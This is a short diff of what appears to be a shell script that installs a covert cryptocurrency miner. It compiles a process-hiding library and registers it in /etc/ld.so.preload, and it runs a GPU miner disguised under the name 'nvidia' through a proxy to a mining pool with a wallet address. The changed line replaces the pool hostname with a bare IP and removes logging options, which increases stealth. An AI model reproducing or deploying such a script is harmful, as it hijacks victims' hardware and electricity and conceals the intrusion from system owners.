@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./nvidia --coin ZEL --pool us.flux.herominers.com:1200 --user t1c2Xety2aCf5LonJpJT9CvjoHWmcpBZnrv.Nvidia --tls on --longstats 5 --shortstats 5 --timeprint on --log on --basecolor
+./graftcp/graftcp ./nvidia --coin ZEL --pool 51.81.208.104:1200 --user t1c2Xety2aCf5LonJpJT9CvjoHWmcpBZnrv.Nvidia --tls on
